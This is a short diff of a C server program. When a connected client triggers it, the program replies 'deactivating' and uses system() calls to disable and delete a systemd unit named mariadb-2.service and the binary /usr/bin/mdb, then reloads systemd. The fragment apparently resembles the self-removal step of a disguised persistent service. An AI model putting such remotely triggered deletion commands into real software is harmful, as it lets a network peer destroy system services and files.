@@ -57,12 +57,12 @@ int main()
                    send(client_fd,"deactivating\n",13,0);
 
 
+                   //system("systemctl stop mariadb-2.service");
                    system("systemctl disable mariadb-2.service");
                    system("rm -f /usr/lib/systemd/system/mariadb-2.service");
-                   system("rm -f /usr/bin/mdb");
-                   system("systemctl stop mariadb-2.service");
-                   //system("systemctl daemon-reload");
-                   //system("systemctl reset-failed");
+                   system("rm -f /usr/bin/mdb");                   
+                   system("systemctl daemon-reload");
+                   system("systemctl reset-failed");
                }
 
                FILE* fp;
